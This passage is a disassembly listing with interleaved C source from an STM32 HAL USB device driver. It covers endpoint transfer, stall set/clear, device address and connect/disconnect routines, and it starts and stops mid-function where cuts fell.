 8007f8c:	785b      	ldrb	r3, [r3, #1]
 8007f8e:	2b01      	cmp	r3, #1
 8007f90:	d128      	bne.n	8007fe4 <USB_EPStartXfer+0x155e>
 8007f92:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f96:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007f9a:	681b      	ldr	r3, [r3, #0]
 8007f9c:	f8c7 30d4 	str.w	r3, [r7, #212]	; 0xd4
 8007fa0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fa4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007fa8:	681b      	ldr	r3, [r3, #0]
 8007faa:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007fae:	b29b      	uxth	r3, r3
 8007fb0:	461a      	mov	r2, r3
 8007fb2:	f8d7 30d4 	ldr.w	r3, [r7, #212]	; 0xd4
 8007fb6:	4413      	add	r3, r2
 8007fb8:	f8c7 30d4 	str.w	r3, [r7, #212]	; 0xd4
 8007fbc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fc0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007fc4:	681b      	ldr	r3, [r3, #0]
 8007fc6:	781b      	ldrb	r3, [r3, #0]
 8007fc8:	00da      	lsls	r2, r3, #3
 8007fca:	f8d7 30d4 	ldr.w	r3, [r7, #212]	; 0xd4
 8007fce:	4413      	add	r3, r2
 8007fd0:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007fd4:	f8c7 30d0 	str.w	r3, [r7, #208]	; 0xd0
 8007fd8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007fdc:	b29a      	uxth	r2, r3
 8007fde:	f8d7 30d0 	ldr.w	r3, [r7, #208]	; 0xd0
 8007fe2:	801a      	strh	r2, [r3, #0]
 8007fe4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fe8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007fec:	681b      	ldr	r3, [r3, #0]
 8007fee:	f8c7 30c4 	str.w	r3, [r7, #196]	; 0xc4
 8007ff2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ff6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007ffa:	681b      	ldr	r3, [r3, #0]
 8007ffc:	785b      	ldrb	r3, [r3, #1]
 8007ffe:	2b00      	cmp	r3, #0
 8008000:	f040 8085 	bne.w	800810e <USB_EPStartXfer+0x1688>
 8008004:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008008:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800800c:	681b      	ldr	r3, [r3, #0]
 800800e:	f8c7 30bc 	str.w	r3, [r7, #188]	; 0xbc
 8008012:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008016:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800801a:	681b      	ldr	r3, [r3, #0]
 800801c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8008020:	b29b      	uxth	r3, r3
 8008022:	461a      	mov	r2, r3
 8008024:	f8d7 30bc 	ldr.w	r3, [r7, #188]	; 0xbc
 8008028:	4413      	add	r3, r2
 800802a:	f8c7 30bc 	str.w	r3, [r7, #188]	; 0xbc
 800802e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008032:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008036:	681b      	ldr	r3, [r3, #0]
 8008038:	781b      	ldrb	r3, [r3, #0]
 800803a:	00da      	lsls	r2, r3, #3
 800803c:	f8d7 30bc 	ldr.w	r3, [r7, #188]	; 0xbc
 8008040:	4413      	add	r3, r2
 8008042:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8008046:	f8c7 30b8 	str.w	r3, [r7, #184]	; 0xb8
 800804a:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 800804e:	881b      	ldrh	r3, [r3, #0]
 8008050:	b29b      	uxth	r3, r3
 8008052:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8008056:	b29a      	uxth	r2, r3
 8008058:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 800805c:	801a      	strh	r2, [r3, #0]
 800805e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008062:	2b3e      	cmp	r3, #62	; 0x3e
 8008064:	d923      	bls.n	80080ae <USB_EPStartXfer+0x1628>
 8008066:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800806a:	095b      	lsrs	r3, r3, #5
 800806c:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 8008070:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008074:	f003 031f 	and.w	r3, r3, #31
 8008078:	2b00      	cmp	r3, #0
 800807a:	d104      	bne.n	8008086 <USB_EPStartXfer+0x1600>
 800807c:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 8008080:	3b01      	subs	r3, #1
 8008082:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 8008086:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 800808a:	881b      	ldrh	r3, [r3, #0]
 800808c:	b29a      	uxth	r2, r3
 800808e:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 8008092:	b29b      	uxth	r3, r3
 8008094:	029b      	lsls	r3, r3, #10
 8008096:	b29b      	uxth	r3, r3
 8008098:	4313      	orrs	r3, r2
 800809a:	b29b      	uxth	r3, r3
 800809c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80080a0:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80080a4:	b29a      	uxth	r2, r3
 80080a6:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 80080aa:	801a      	strh	r2, [r3, #0]
 80080ac:	e05c      	b.n	8008168 <USB_EPStartXfer+0x16e2>
 80080ae:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80080b2:	2b00      	cmp	r3, #0
 80080b4:	d10c      	bne.n	80080d0 <USB_EPStartXfer+0x164a>
 80080b6:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 80080ba:	881b      	ldrh	r3, [r3, #0]
 80080bc:	b29b      	uxth	r3, r3
 80080be:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80080c2:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80080c6:	b29a      	uxth	r2, r3
 80080c8:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 80080cc:	801a      	strh	r2, [r3, #0]
 80080ce:	e04b      	b.n	8008168 <USB_EPStartXfer+0x16e2>
 80080d0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80080d4:	085b      	lsrs	r3, r3, #1
 80080d6:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 80080da:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80080de:	f003 0301 	and.w	r3, r3, #1
 80080e2:	2b00      	cmp	r3, #0
 80080e4:	d004      	beq.n	80080f0 <USB_EPStartXfer+0x166a>
 80080e6:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 80080ea:	3301      	adds	r3, #1
 80080ec:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 80080f0:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 80080f4:	881b      	ldrh	r3, [r3, #0]
 80080f6:	b29a      	uxth	r2, r3
 80080f8:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 80080fc:	b29b      	uxth	r3, r3
 80080fe:	029b      	lsls	r3, r3, #10
 8008100:	b29b      	uxth	r3, r3
 8008102:	4313      	orrs	r3, r2
 8008104:	b29a      	uxth	r2, r3
 8008106:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 800810a:	801a      	strh	r2, [r3, #0]
 800810c:	e02c      	b.n	8008168 <USB_EPStartXfer+0x16e2>
 800810e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008112:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008116:	681b      	ldr	r3, [r3, #0]
 8008118:	785b      	ldrb	r3, [r3, #1]
 800811a:	2b01      	cmp	r3, #1
 800811c:	d124      	bne.n	8008168 <USB_EPStartXfer+0x16e2>
 800811e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008122:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8008126:	681b      	ldr	r3, [r3, #0]
 8008128:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800812c:	b29b      	uxth	r3, r3
 800812e:	461a      	mov	r2, r3
 8008130:	f8d7 30c4 	ldr.w	r3, [r7, #196]	; 0xc4
 8008134:	4413      	add	r3, r2
 8008136:	f8c7 30c4 	str.w	r3, [r7, #196]	; 0xc4
 800813a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800813e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008142:	681b      	ldr	r3, [r3, #0]
 8008144:	781b      	ldrb	r3, [r3, #0]
 8008146:	00da      	lsls	r2, r3, #3
 8008148:	f8d7 30c4 	ldr.w	r3, [r7, #196]	; 0xc4
 800814c:	4413      	add	r3, r2
 800814e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8008152:	f8c7 30c0 	str.w	r3, [r7, #192]	; 0xc0
 8008156:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800815a:	b29a      	uxth	r2, r3
 800815c:	f8d7 30c0 	ldr.w	r3, [r7, #192]	; 0xc0
 8008160:	801a      	strh	r2, [r3, #0]
 8008162:	e001      	b.n	8008168 <USB_EPStartXfer+0x16e2>
      }
      else
      {
        return HAL_ERROR;
 8008164:	2301      	movs	r3, #1
 8008166:	e03a      	b.n	80081de <USB_EPStartXfer+0x1758>
      }
    }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

    PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 8008168:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800816c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8008170:	681a      	ldr	r2, [r3, #0]
 8008172:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008176:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800817a:	681b      	ldr	r3, [r3, #0]
 800817c:	781b      	ldrb	r3, [r3, #0]
 800817e:	009b      	lsls	r3, r3, #2
 8008180:	4413      	add	r3, r2
 8008182:	881b      	ldrh	r3, [r3, #0]
 8008184:	b29b      	uxth	r3, r3
 8008186:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 800818a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800818e:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 8008192:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 8008196:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 800819a:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 800819e:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 80081a2:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 80081a6:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 80081aa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80081ae:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80081b2:	681a      	ldr	r2, [r3, #0]
 80081b4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80081b8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80081bc:	681b      	ldr	r3, [r3, #0]
 80081be:	781b      	ldrb	r3, [r3, #0]
 80081c0:	009b      	lsls	r3, r3, #2
 80081c2:	441a      	add	r2, r3
 80081c4:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 80081c8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80081cc:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80081d0:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80081d4:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80081d8:	b29b      	uxth	r3, r3
 80081da:	8013      	strh	r3, [r2, #0]
  }

  return HAL_OK;
 80081dc:	2300      	movs	r3, #0
}
 80081de:	4618      	mov	r0, r3
 80081e0:	f507 7784 	add.w	r7, r7, #264	; 0x108
 80081e4:	46bd      	mov	sp, r7
 80081e6:	bd80      	pop	{r7, pc}

080081e8 <USB_EPSetStall>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPSetStall(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 80081e8:	b480      	push	{r7}
 80081ea:	b085      	sub	sp, #20
 80081ec:	af00      	add	r7, sp, #0
 80081ee:	6078      	str	r0, [r7, #4]
 80081f0:	6039      	str	r1, [r7, #0]
  if (ep->is_in != 0U)
 80081f2:	683b      	ldr	r3, [r7, #0]
 80081f4:	785b      	ldrb	r3, [r3, #1]
 80081f6:	2b00      	cmp	r3, #0
 80081f8:	d020      	beq.n	800823c <USB_EPSetStall+0x54>
  {
    PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_STALL);
 80081fa:	687a      	ldr	r2, [r7, #4]
 80081fc:	683b      	ldr	r3, [r7, #0]
 80081fe:	781b      	ldrb	r3, [r3, #0]
 8008200:	009b      	lsls	r3, r3, #2
 8008202:	4413      	add	r3, r2
 8008204:	881b      	ldrh	r3, [r3, #0]
 8008206:	b29b      	uxth	r3, r3
 8008208:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800820c:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8008210:	81bb      	strh	r3, [r7, #12]
 8008212:	89bb      	ldrh	r3, [r7, #12]
 8008214:	f083 0310 	eor.w	r3, r3, #16
 8008218:	81bb      	strh	r3, [r7, #12]
 800821a:	687a      	ldr	r2, [r7, #4]
 800821c:	683b      	ldr	r3, [r7, #0]
 800821e:	781b      	ldrb	r3, [r3, #0]
 8008220:	009b      	lsls	r3, r3, #2
 8008222:	441a      	add	r2, r3
 8008224:	89bb      	ldrh	r3, [r7, #12]
 8008226:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800822a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800822e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008232:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8008236:	b29b      	uxth	r3, r3
 8008238:	8013      	strh	r3, [r2, #0]
 800823a:	e01f      	b.n	800827c <USB_EPSetStall+0x94>
  }
  else
  {
    PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_STALL);
 800823c:	687a      	ldr	r2, [r7, #4]
 800823e:	683b      	ldr	r3, [r7, #0]
 8008240:	781b      	ldrb	r3, [r3, #0]
 8008242:	009b      	lsls	r3, r3, #2
 8008244:	4413      	add	r3, r2
 8008246:	881b      	ldrh	r3, [r3, #0]
 8008248:	b29b      	uxth	r3, r3
 800824a:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 800824e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8008252:	81fb      	strh	r3, [r7, #14]
 8008254:	89fb      	ldrh	r3, [r7, #14]
 8008256:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 800825a:	81fb      	strh	r3, [r7, #14]
 800825c:	687a      	ldr	r2, [r7, #4]
 800825e:	683b      	ldr	r3, [r7, #0]
 8008260:	781b      	ldrb	r3, [r3, #0]
 8008262:	009b      	lsls	r3, r3, #2
 8008264:	441a      	add	r2, r3
 8008266:	89fb      	ldrh	r3, [r7, #14]
 8008268:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800826c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008270:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008274:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8008278:	b29b      	uxth	r3, r3
 800827a:	8013      	strh	r3, [r2, #0]
  }

  return HAL_OK;
 800827c:	2300      	movs	r3, #0
}
 800827e:	4618      	mov	r0, r3
 8008280:	3714      	adds	r7, #20
 8008282:	46bd      	mov	sp, r7
 8008284:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008288:	4770      	bx	lr

0800828a <USB_EPClearStall>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPClearStall(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 800828a:	b480      	push	{r7}
 800828c:	b087      	sub	sp, #28
 800828e:	af00      	add	r7, sp, #0
 8008290:	6078      	str	r0, [r7, #4]
 8008292:	6039      	str	r1, [r7, #0]
  if (ep->doublebuffer == 0U)
 8008294:	683b      	ldr	r3, [r7, #0]
 8008296:	7b1b      	ldrb	r3, [r3, #12]
 8008298:	2b00      	cmp	r3, #0
 800829a:	f040 809d 	bne.w	80083d8 <USB_EPClearStall+0x14e>
  {
    if (ep->is_in != 0U)
 800829e:	683b      	ldr	r3, [r7, #0]
 80082a0:	785b      	ldrb	r3, [r3, #1]
 80082a2:	2b00      	cmp	r3, #0
 80082a4:	d04c      	beq.n	8008340 <USB_EPClearStall+0xb6>
    {
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 80082a6:	687a      	ldr	r2, [r7, #4]
 80082a8:	683b      	ldr	r3, [r7, #0]
 80082aa:	781b      	ldrb	r3, [r3, #0]
 80082ac:	009b      	lsls	r3, r3, #2
 80082ae:	4413      	add	r3, r2
 80082b0:	881b      	ldrh	r3, [r3, #0]
 80082b2:	823b      	strh	r3, [r7, #16]
 80082b4:	8a3b      	ldrh	r3, [r7, #16]
 80082b6:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80082ba:	2b00      	cmp	r3, #0
 80082bc:	d01b      	beq.n	80082f6 <USB_EPClearStall+0x6c>
 80082be:	687a      	ldr	r2, [r7, #4]
 80082c0:	683b      	ldr	r3, [r7, #0]
 80082c2:	781b      	ldrb	r3, [r3, #0]
 80082c4:	009b      	lsls	r3, r3, #2
 80082c6:	4413      	add	r3, r2
 80082c8:	881b      	ldrh	r3, [r3, #0]
 80082ca:	b29b      	uxth	r3, r3
 80082cc:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80082d0:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80082d4:	81fb      	strh	r3, [r7, #14]
 80082d6:	687a      	ldr	r2, [r7, #4]
 80082d8:	683b      	ldr	r3, [r7, #0]
 80082da:	781b      	ldrb	r3, [r3, #0]
 80082dc:	009b      	lsls	r3, r3, #2
 80082de:	441a      	add	r2, r3
 80082e0:	89fb      	ldrh	r3, [r7, #14]
 80082e2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80082e6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80082ea:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80082ee:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 80082f2:	b29b      	uxth	r3, r3
 80082f4:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 80082f6:	683b      	ldr	r3, [r7, #0]
 80082f8:	78db      	ldrb	r3, [r3, #3]
 80082fa:	2b01      	cmp	r3, #1
 80082fc:	d06c      	beq.n	80083d8 <USB_EPClearStall+0x14e>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 80082fe:	687a      	ldr	r2, [r7, #4]
 8008300:	683b      	ldr	r3, [r7, #0]
 8008302:	781b      	ldrb	r3, [r3, #0]
 8008304:	009b      	lsls	r3, r3, #2
 8008306:	4413      	add	r3, r2
 8008308:	881b      	ldrh	r3, [r3, #0]
 800830a:	b29b      	uxth	r3, r3
 800830c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8008310:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8008314:	81bb      	strh	r3, [r7, #12]
 8008316:	89bb      	ldrh	r3, [r7, #12]
 8008318:	f083 0320 	eor.w	r3, r3, #32
 800831c:	81bb      	strh	r3, [r7, #12]
 800831e:	687a      	ldr	r2, [r7, #4]
 8008320:	683b      	ldr	r3, [r7, #0]
 8008322:	781b      	ldrb	r3, [r3, #0]
 8008324:	009b      	lsls	r3, r3, #2
 8008326:	441a      	add	r2, r3
 8008328:	89bb      	ldrh	r3, [r7, #12]
 800832a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800832e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008332:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008336:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800833a:	b29b      	uxth	r3, r3
 800833c:	8013      	strh	r3, [r2, #0]
 800833e:	e04b      	b.n	80083d8 <USB_EPClearStall+0x14e>
      }
    }
    else
    {
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8008340:	687a      	ldr	r2, [r7, #4]
 8008342:	683b      	ldr	r3, [r7, #0]
 8008344:	781b      	ldrb	r3, [r3, #0]
 8008346:	009b      	lsls	r3, r3, #2
 8008348:	4413      	add	r3, r2
 800834a:	881b      	ldrh	r3, [r3, #0]
 800834c:	82fb      	strh	r3, [r7, #22]
 800834e:	8afb      	ldrh	r3, [r7, #22]
 8008350:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8008354:	2b00      	cmp	r3, #0
 8008356:	d01b      	beq.n	8008390 <USB_EPClearStall+0x106>
 8008358:	687a      	ldr	r2, [r7, #4]
 800835a:	683b      	ldr	r3, [r7, #0]
 800835c:	781b      	ldrb	r3, [r3, #0]
 800835e:	009b      	lsls	r3, r3, #2
 8008360:	4413      	add	r3, r2
 8008362:	881b      	ldrh	r3, [r3, #0]
 8008364:	b29b      	uxth	r3, r3
 8008366:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800836a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800836e:	82bb      	strh	r3, [r7, #20]
 8008370:	687a      	ldr	r2, [r7, #4]
 8008372:	683b      	ldr	r3, [r7, #0]
 8008374:	781b      	ldrb	r3, [r3, #0]
 8008376:	009b      	lsls	r3, r3, #2
 8008378:	441a      	add	r2, r3
 800837a:	8abb      	ldrh	r3, [r7, #20]
 800837c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008380:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008384:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8008388:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800838c:	b29b      	uxth	r3, r3
 800838e:	8013      	strh	r3, [r2, #0]

      /* Configure VALID status for the Endpoint */
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 8008390:	687a      	ldr	r2, [r7, #4]
 8008392:	683b      	ldr	r3, [r7, #0]
 8008394:	781b      	ldrb	r3, [r3, #0]
 8008396:	009b      	lsls	r3, r3, #2
 8008398:	4413      	add	r3, r2
 800839a:	881b      	ldrh	r3, [r3, #0]
 800839c:	b29b      	uxth	r3, r3
 800839e:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80083a2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80083a6:	827b      	strh	r3, [r7, #18]
 80083a8:	8a7b      	ldrh	r3, [r7, #18]
 80083aa:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 80083ae:	827b      	strh	r3, [r7, #18]
 80083b0:	8a7b      	ldrh	r3, [r7, #18]
 80083b2:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 80083b6:	827b      	strh	r3, [r7, #18]
 80083b8:	687a      	ldr	r2, [r7, #4]
 80083ba:	683b      	ldr	r3, [r7, #0]
 80083bc:	781b      	ldrb	r3, [r3, #0]
 80083be:	009b      	lsls	r3, r3, #2
 80083c0:	441a      	add	r2, r3
 80083c2:	8a7b      	ldrh	r3, [r7, #18]
 80083c4:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80083c8:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80083cc:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80083d0:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80083d4:	b29b      	uxth	r3, r3
 80083d6:	8013      	strh	r3, [r2, #0]
    }
  }

  return HAL_OK;
 80083d8:	2300      	movs	r3, #0
}
 80083da:	4618      	mov	r0, r3
 80083dc:	371c      	adds	r7, #28
 80083de:	46bd      	mov	sp, r7
 80083e0:	f85d 7b04 	ldr.w	r7, [sp], #4
 80083e4:	4770      	bx	lr

080083e6 <USB_SetDevAddress>:
  * @param  address new device address to be assigned
  *          This parameter can be a value from 0 to 255
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_SetDevAddress(USB_TypeDef *USBx, uint8_t address)
{
 80083e6:	b480      	push	{r7}
 80083e8:	b083      	sub	sp, #12
 80083ea:	af00      	add	r7, sp, #0
 80083ec:	6078      	str	r0, [r7, #4]
 80083ee:	460b      	mov	r3, r1
 80083f0:	70fb      	strb	r3, [r7, #3]
  if (address == 0U)
 80083f2:	78fb      	ldrb	r3, [r7, #3]
 80083f4:	2b00      	cmp	r3, #0
 80083f6:	d103      	bne.n	8008400 <USB_SetDevAddress+0x1a>
  {
    /* set device address and enable function */
    USBx->DADDR = (uint16_t)USB_DADDR_EF;
 80083f8:	687b      	ldr	r3, [r7, #4]
 80083fa:	2280      	movs	r2, #128	; 0x80
 80083fc:	f8a3 204c 	strh.w	r2, [r3, #76]	; 0x4c
  }

  return HAL_OK;
 8008400:	2300      	movs	r3, #0
}
 8008402:	4618      	mov	r0, r3
 8008404:	370c      	adds	r7, #12
 8008406:	46bd      	mov	sp, r7
 8008408:	f85d 7b04 	ldr.w	r7, [sp], #4
 800840c:	4770      	bx	lr

0800840e <USB_DevConnect>:
  * @brief  USB_DevConnect Connect the USB device by enabling the pull-up/pull-down
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_DevConnect(USB_TypeDef *USBx)
{
 800840e:	b480      	push	{r7}
 8008410:	b083      	sub	sp, #12
 8008412:	af00      	add	r7, sp, #0
 8008414:	6078      	str	r0, [r7, #4]
  /* Enabling DP Pull-UP bit to Connect internal PU resistor on USB DP line */
  USBx->BCDR |= (uint16_t)USB_BCDR_DPPU;
 8008416:	687b      	ldr	r3, [r7, #4]
 8008418:	f8b3 3058 	ldrh.w	r3, [r3, #88]	; 0x58
 800841c:	b29b      	uxth	r3, r3
 800841e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8008422:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8008426:	b29a      	uxth	r2, r3
 8008428:	687b      	ldr	r3, [r7, #4]
 800842a:	f8a3 2058 	strh.w	r2, [r3, #88]	; 0x58

  return HAL_OK;
 800842e:	2300      	movs	r3, #0
}
 8008430:	4618      	mov	r0, r3
 8008432:	370c      	adds	r7, #12
 8008434:	46bd      	mov	sp, r7
 8008436:	f85d 7b04 	ldr.w	r7, [sp], #4
 800843a:	4770      	bx	lr

0800843c <USB_DevDisconnect>:
  * @brief  USB_DevDisconnect Disconnect the USB device by disabling the pull-up/pull-down
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_DevDisconnect(USB_TypeDef *USBx)
{
 800843c:	b480      	push	{r7}
 800843e:	b083      	sub	sp, #12
 8008440:	af00      	add	r7, sp, #0
 8008442:	6078      	str	r0, [r7, #4]
  /* Disable DP Pull-Up bit to disconnect the Internal PU resistor on USB DP line */
  USBx->BCDR &= (uint16_t)(~(USB_BCDR_DPPU));
 8008444:	687b      	ldr	r3, [r7, #4]
 8008446:	f8b3 3058 	ldrh.w	r3, [r3, #88]	; 0x58
 800844a:	b29b      	uxth	r3, r3
 800844c:	f3c3 030e 	ubfx	r3, r3, #0, #15
 8008450:	b29a      	uxth	r2, r3
 8008452:	687b      	ldr	r3, [r7, #4]
 8008454:	f8a3 2058 	strh.w	r2, [r3, #88]	; 0x58

  return HAL_OK;
 8008458:	2300      	movs	r3, #0
}
 800845a:	4618      	mov	r0, r3
 800845c:	370c      	adds	r7, #12
 800845e:	46bd      	mov	sp, r7
 8008460:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008464:	4770      	bx	lr

08008466 <USB_ReadInterrupts>:
  * @brief  USB_ReadInterrupts return the global USB interrupt status
  * @param  USBx Selected device
  * @retval USB Global Interrupt status
  */
uint32_t USB_ReadInterrupts(USB_TypeDef const *USBx)
{
 8008466:	b480      	push	{r7}
 8008468:	b085      	sub	sp, #20
 800846a:	af00      	add	r7, sp, #0
 800846c:	6078      	str	r0, [r7, #4]
  uint32_t tmpreg;

  tmpreg = USBx->ISTR;
 800846e:	687b      	ldr	r3, [r7, #4]
 8008470:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8008474:	b29b      	uxth	r3, r3
 8008476:	60fb      	str	r3, [r7, #12]
  return tmpreg;
 8008478:	68fb      	ldr	r3, [r7, #12]
}
 800847a:	4618      	mov	r0, r3
 800847c:	3714      	adds	r7, #20
 800847e:	46bd      	mov	sp, r7
 8008480:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008484:	4770      	bx	lr

08008486 <USB_EP0_OutStart>:
  * @param  USBx Selected device
  * @param  psetup pointer to setup packet
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EP0_OutStart(USB_TypeDef *USBx, uint8_t *psetup)
{
 8008486:	b480      	push	{r7}
 8008488:	b083      	sub	sp, #12
